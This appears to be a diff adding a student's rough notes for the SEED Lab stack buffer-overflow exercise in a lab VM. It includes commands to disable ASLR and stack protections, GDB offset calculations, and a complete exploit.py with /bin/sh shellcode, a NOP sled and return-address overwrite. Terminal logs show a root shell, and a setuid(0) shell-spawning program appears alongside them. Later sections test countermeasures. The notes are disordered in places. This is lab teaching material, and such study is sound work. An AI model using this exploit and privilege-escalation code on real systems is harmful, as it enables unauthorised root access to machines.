@@ -1,0 +1,308 @@
+First command:
+
+Disable ASLR
+
+sudo sysctl -w kernel.randomize_va_space=0
+
+Step 1: Understand the Vulnerable Code (stack.c)
+
+Here's the typical content of stack.c from SEED Lab:
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+int foo(char *str) {
+    char buffer[100];
+
+    // Vulnerable function: no bounds checking!
+    strcpy(buffer, str);
+
+    return 1;
+}
+
+int main(int argc, char **argv) {
+    char str[517];
+    FILE *badfile;
+
+    badfile = fopen("badfile", "r");
+    fread(str, sizeof(char), 517, badfile);
+    foo(str);
+
+    printf("Returned Properly\n");
+    return 1;
+}
+
+Step 2: Compile the Vulnerable Program
+
+gcc -m32 -fno-stack-protector -z execstack -o stack stack.c
+sudo chown root stack
+sudo chmod 4755 stack
+
+    ✅ -m32: Compile for 32-bit (stack layout is easier to manipulate)
+
+    ✅ -fno-stack-protector: Disable Stack Canary
+
+    ✅ -z execstack: Make stack executable (to run shellcode)
+
+    ✅ chmod 4755: Set SUID bit so it runs with root privilege
+    
+    
+    
+    Step 3: Test Program Behavior
+Create a small file:
+
+echo "aaaa" > badfile
+./stack
+# Output: Returned Properly ✅
+
+Create an overflowing file:
+
+python3 -c 'print("A"*200)' > badfile
+./stack
+# Output: Segmentation fault (core dumped) ❌
+
+
+prog.c...
+#include <stdio.h>
+
+void func(int* a1) {
+    printf(" :: a1’s address is 0x%x \n", (unsigned int) &a1);
+}
+
+int main() {
+    int x = 3;
+    func(&x);
+    return 1;
+}
+07/20/25]seed@VM:~/Documents$ sudo gcc -m32 -o prog prog.c
+[07/20/25]seed@VM:~/Documents$ ./prog
+ :: a1’s address is 0xbfffeda0 
+[07/20/25]seed@VM:~/Documents$ sudo gcc -m32 -o prog prog.c
+[07/20/25]seed@VM:~/Documents$ ./prog
+ :: a1’s address is 0xbfffeda0 
+[07/20/25]seed@VM:~/Documents$ 
+
+//3. Compile with Vulnerabilities Enabled
+
+$ gcc -m32 -z execstack -fno-stack-protector -g -o stack_dbg stack.c
+
+Explanation:
+
+    -m32: Compile 32-bit binary
+
+    -z execstack: Make stack executable
+
+    -fno-stack-protector: Disable stack canary protection
+
+    -g: Add debug info for GDB//
+    
+    . Run and Debug to Find Stack Addresses
+
+$ touch badfile               # Create dummy input
+$ gdb stack_dbg               # Launch debugger
+
+Inside GDB:
+
+gdb-peda$ b foo               # Set breakpoint at foo()
+gdb-peda$ run                # Start the program
+gdb-peda$ next               # Step over until EBP is set
+gdb-peda$ p $ebp             # Get frame pointer
+$1 = (void *) 0xffffcf58
+gdb-peda$ p &buffer
+$2 = (char (*)[100]) 0xffffceec
+gdb-peda$ p/d 0xffffcf58 - 0xffffceec
+$3 = 108//
+
+buffer is at 0xffffceec
+
+ebp is at 0xffffcf58
+
+Return address is at ebp + 4 = 0xffffcf5c
+
+So distance between buffer and return address: 112 bytes
+
+
+
+Ensure GDB is loading the correct binary with symbols
+
+You can verify symbols with:
+
+nm stack_dbg | grep foo
+
+Expected output should be something like:
+
+080484b6 T foo
+
+If you don't see anything, then the foo() function may have been optimized out or not compiled properly.
+
+
+3. Make sure you included -g and avoided -O2 or other optimizations
+
+Use exactly:
+
+gcc -m32 -z execstack -fno-stack-protector -g -o stack_dbg stack.c
+
+Avoid flags like -O2 or -s which strip debugging symbols.
+
+
+
+exploit.py — Full Working Exploit Script
+
+#!/usr/bin/python3
+
+# Import required module
+import sys
+
+# Step 1: Define shellcode
+shellcode = (
+    "\x31\xc0"          # xor    eax,eax
+    "\x50"              # push   eax
+    "\x68""//sh"        # push   "//sh"
+    "\x68""/bin"        # push   "/bin"
+    "\x89\xe3"          # mov    ebx,esp
+    "\x50"              # push   eax
+    "\x53"              # push   ebx
+    "\x89\xe1"          # mov    ecx,esp
+    "\x99"              # cdq
+    "\xb0\x0b"          # mov    al,0xb
+    "\xcd\x80"          # int    0x80
+).encode('latin-1')     # Shellcode must be encoded as bytes
+
+# Step 2: Create a NOP sled (padding)
+content = bytearray(0x90 for i in range(400))  # 0x90 = NOP
+
+# Step 3: Put shellcode at the end of the buffer
+start = 400 - len(shellcode)
+content[start:] = shellcode
+
+# Step 4: Overwrite the return address at offset 112 (adjust if needed)
+ret = 0xffffcf58 + 200     # Stack address + offset, tune this value if it fails
+content[112:116] = (ret).to_bytes(4, byteorder='little')
+
+# Step 5: Write to 'badfile'
+with open('badfile', 'wb') as f:
+    f.write(content)
+STEP 2: Update Return Address in exploit.py
+
+Modify this line in your exploit:
+
+ret = 0xffffcf90
+Step 4: Write exploit.py
+
+Create exploit.py in the same directory as stack.
+
+chmod +x exploit.py
+./exploit.py        # Generates the file 'badfile'
+
+✅ Step 5: Run the Exploit
+
+Run the vulnerable program:
+
+./stack
+
+If it succeeds, you'll get a root shell (# prompt):
+
+# id
+uid=1000(seed) gid=1000(seed) euid=0(root) groups=0(root), ...//done
+
+
+
+
+
+task 1:
+gcc -z execstack -fno-stack-protector -o call_shellcode call_shellcode.c
+$-normal user
+
+//
+[07/21/25]seed@VM:~/Documents$ touch makeitroot.c
+[07/21/25]seed@VM:~/Documents$ gcc -o makeitroot makeitroot.c
+makeitroot.c: In function ‘main’:
+makeitroot.c:3:1: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+ setuid(0); system("/bin/sh");
+ ^
+makeitroot.c:3:12: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
+ setuid(0); system("/bin/sh");
+            ^
+no run the makeitroot to get uid 0;
+
+now ,
+countermeasure......
+task3:sudo ln -sf /bin/dash /bin/sh
+
+ gcc dash_shell_test.c -o dash_shell_test
+ sudo chown root dash_shell_test
+ sudo chmod 4755 dash_shell_test
+ 
+ 
+ 
+ 
+ 
+ ./dash_shell_test
+ 
+ now removing comment---
+ $ exit
+[07/21/25]seed@VM:~/Documents$ touch removecommentsetuid.c
+[07/21/25]seed@VM:~/Documents$ gcc -o removecommentsetuid removecommentsetuid.c 
+[07/21/25]seed@VM:~/Documents$ sudo chown root removecommentsetuid 
+[07/21/25]seed@VM:~/Documents$ sudo chmod 4755 removecommentsetuid 
+[07/21/25]seed@VM:~/Documents$ ll
+total 96
+-rw-rw-r-- 1 seed seed  400 Jul 20 09:53 badfile
+-rwxrwxr-x 1 seed seed 7340 Jul 21 07:52 call_shellcode
+-rw-rw-r-- 1 seed seed 1177 Jul 21 07:52 call_shellcode.c
+-rwsr-xr-x 1 root seed 7404 Jul 21 08:30 dash_shell_test
+-rw-rw-r-- 1 seed seed  225 Jul 21 08:24 dash_shell_test.c
+-rwxrwxr-x 1 seed seed 1246 Jul 20 09:53 exploit.py
+-rwxrwxr-x 1 seed seed 7388 Jul 21 08:12 makeitroot
+-rw-rw-r-- 1 seed seed   46 Jul 21 08:11 makeitroot.c
+-rw-rw-r-- 1 seed seed   11 Jul 20 08:52 peda-session-stack_dbg.txt
+-rwxr-xr-x 1 root root 7416 Jul 20 08:25 prog
+-rw-rw-r-- 1 seed seed  168 Jul 20 08:22 prog.c
+-rwsr-xr-x 1 root seed 7448 Jul 21 08:40 removecommentsetuid
+-rw-rw-r-- 1 seed seed  210 Jul 21 08:37 removecommentsetuid.c
+-rwsr-xr-x 1 root seed 7476 Jul 20 08:46 stack
+-rwxrwx--- 1 seed seed  416 Jul 20 08:42 stack.c
+-rwxrwxr-x 1 seed seed 9780 Jul 20 08:50 stack_dbg
+[07/21/25]seed@VM:~/Documents$ ./removecommentsetuid 
+# exit
+then task 4:
+sudo /sbin/sysctl -w kernel.randomize_va_space=2
+
+./bruteattack
+[07/21/25]seed@VM:~/Documents$ sudo chown root bruteattack 
+[07/21/25]seed@VM:~/Documents$ sudo chmod 4755 bruteattack
+
+task5:
+[07/21/25]seed@VM:~/Documents$ gcc -o stackne0 -z execstack stack.c[07/21/25]seed@VM:~/Documents$ sudo chown root stackne0
+[07/21/25]seed@VM:~/Documents$ sudo chmod 4755 stackne0
+[07/21/25]seed@VM:~/Documents$ ll
+total 116
+-rw-rw-r-- 1 seed seed  400 Jul 20 09:53 badfile
+-rwsr-xr-x 1 root seed  267 Jul 21 09:48 bruteattack
+-rwxrwxr-x 1 seed seed 7340 Jul 21 07:52 call_shellcode
+-rw-rw-r-- 1 seed seed 1177 Jul 21 07:52 call_shellcode.c
+-rwsr-xr-x 1 root seed 7404 Jul 21 08:30 dash_shell_test
+-rw-rw-r-- 1 seed seed  225 Jul 21 08:24 dash_shell_test.c
+-rwxrwxr-x 1 seed seed 1246 Jul 20 09:53 exploit.py
+-rwxrwxr-x 1 seed seed 7388 Jul 21 08:12 makeitroot
+-rw-rw-r-- 1 seed seed   46 Jul 21 08:11 makeitroot.c
+-rw-rw-r-- 1 seed seed   11 Jul 20 08:52 peda-session-stack_dbg.txt
+-rwxr-xr-x 1 root root 7416 Jul 20 08:25 prog
+-rw-rw-r-- 1 seed seed  168 Jul 20 08:22 prog.c
+-rwsr-xr-x 1 root seed 7448 Jul 21 08:40 removecommentsetuid
+-rw-rw-r-- 1 seed seed  210 Jul 21 08:37 removecommentsetuid.c
+-rwsr-xr-x 1 root seed 7476 Jul 21 10:05 stack
+-rwxrwx--- 1 seed seed  416 Jul 20 08:42 stack.c
+-rwxrwxr-x 1 seed seed 9780 Jul 20 08:50 stack_dbg
+-rwsr-xr-x 1 root seed 7476 Jul 21 10:06 stackne
+-rwsr-xr-x 1 root seed 7524 Jul 21 10:12 stackne0
+[07/21/25]seed@VM:~/Documents$ ./stackne0
+*** stack smashing detected ***: ./stackne0 terminated
+Aborted
+[07/21/25]seed@VM:~/
+
+task6:
+gcc -o stackne -fno-stack-protector -z noexecstack stack.c
+./stackne
+
